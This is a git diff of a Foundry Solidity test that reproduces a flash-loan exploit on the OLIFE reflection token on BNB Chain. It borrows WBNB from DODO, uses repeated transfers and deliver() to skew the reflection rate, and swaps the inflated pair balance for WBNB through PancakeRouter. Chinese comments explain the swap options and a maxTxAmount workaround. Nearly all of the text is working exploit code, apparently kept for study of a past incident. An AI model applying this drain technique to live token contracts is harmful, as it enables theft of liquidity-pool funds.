@@ -74,6 +74,10 @@ contract ContractTest is Test {
         emit log_named_decimal_uint(
             "[INFO] OLIFE amount in pair before the currentRate reduction", OLIFE.balanceOf(address(OLIFE_WBNB_LPPool)), 9
         );
+        emit log_named_decimal_uint(
+            "[INFO] OLIFE amount in hack contract before the currentRate reduction", OLIFE.balanceOf(address(this)), 9
+        );
+
         loopTransfer(19);
 
         OLIFE.deliver(66859267695870000);
@@ -81,16 +85,47 @@ contract ContractTest is Test {
         emit log_named_decimal_uint(
             "[INFO] OLIFE amount in pair after the currentRate reduction", OLIFE.balanceOf(address(OLIFE_WBNB_LPPool)), 9
         );
+        emit log_named_decimal_uint(
+            "[INFO] OLIFE amount in hack contract after the currentRate reduction", OLIFE.balanceOf(address(this)), 9
+        );
         
         (uint256 oldOlifeReserve, uint256 bnbReserve, ) = OLIFE_WBNB_LPPool.getReserves();
         uint256 newolifeReserve = OLIFE.balanceOf(address(OLIFE_WBNB_LPPool));
         uint256 amountin = newolifeReserve - oldOlifeReserve;
+        emit log_named_decimal_uint(
+            "[INFO] oldOlifeReserve", oldOlifeReserve, 9
+        );
+        emit log_named_decimal_uint(
+            "[INFO] amountin", amountin, 9
+        );
         uint256 swapAmount = amountin * 9975 * bnbReserve / (oldOlifeReserve * 10000 + amountin * 9975);
+        emit log_named_decimal_uint(
+            "[INFO] swapAmount", swapAmount, 18
+        );
         
         //swap OLIFE to WBNB
-        OLIFE_WBNB_LPPool.swap(0, swapAmount, address(this), "");
+        // 这里其实有两种写法, 
+        //这个位置 第二个参数 是传的WBNB的位置 amount1Out, token1 是WBNB
+        // 一种是用LP的直接Swap, 里面传参数是amount0Out, amount1Out, to, data
+        // OLIFE_WBNB_LPPool.swap(0, swapAmount, address(this), "");
 
-        // repay
+        //第二种 则是走Pancake的Router, 
+        address[] memory swapPathAgain = new address[](2);
+        swapPathAgain[0] = address(OLIFE);
+        swapPathAgain[1] = address(WBNB);
+        IERC20(0xb5a0Ce3Acd6eC557d39aFDcbC93B07a1e1a9e3fa).approve(address(pancakeRouter), type(uint256).max);
+        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            // OLIFE.balanceOf(address(this)),
+            // 这里之所以 不能用 OLIFE.balanceOf(address(this)), 是因为, 对应Token合约代码中的 388 行, 即Transfer amount exceeds the maxTxAmount. 这个报错
+            260000000000000000,
+            0,
+            swapPathAgain,
+            address(this),
+            block.timestamp
+        );
+
+
+        // // repay
         WBNB.transfer(address(dodo), FLASHLOAN_WBNB_AMOUNT);
     }
 
